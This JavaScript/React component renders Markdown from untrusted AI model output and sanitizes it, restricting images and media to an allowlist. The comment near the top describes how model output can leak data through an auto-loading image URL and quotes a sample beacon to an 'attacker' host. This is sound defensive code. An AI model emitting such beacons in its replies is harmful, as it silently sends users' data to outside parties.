import { marked } from 'marked'
import DOMPurify from 'dompurify'
import { resourceAllowed } from './mediaHosts.js'

// Chat renders untrusted model output. A tag that auto-loads a remote resource
// is an exfiltration channel: the URL carries the data and the fetch fires on
// render, with no agent network call at all (the `![](http://attacker/leak?d=)`
// beacon). So images/video only load from the operator's media allowlist (or a
// same-origin path / inert data: image); every other resource URL is stripped.
// iframe/object/embed stay forbidden outright — they can run code, not just load.
const RESOURCE_ATTRS = ['src', 'srcset', 'poster', 'background', 'data']

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  const strip = (attr) => {
    const value = node.getAttribute?.(attr)
    if (value && !resourceAllowed(value)) node.removeAttribute(attr)
  }
  RESOURCE_ATTRS.forEach(strip)
  // href auto-loads on <link>/<image>/<use> but is user-initiated on <a>, so
  // only anchors keep a remote href.
  if (node.tagName?.toLowerCase() !== 'a') ['href', 'xlink:href'].forEach(strip)
})

export default function Md({ text }) {
  const html = DOMPurify.sanitize(marked.parse(text || '', { breaks: true }), {
    FORBID_TAGS: ['iframe', 'object', 'embed'],
    ADD_TAGS: ['video', 'audio', 'source', 'track'],
    ADD_ATTR: ['controls', 'loop', 'muted', 'playsinline', 'poster'],
  })
  return <div className="md-body" dangerouslySetInnerHTML={{ __html: html }} />
}
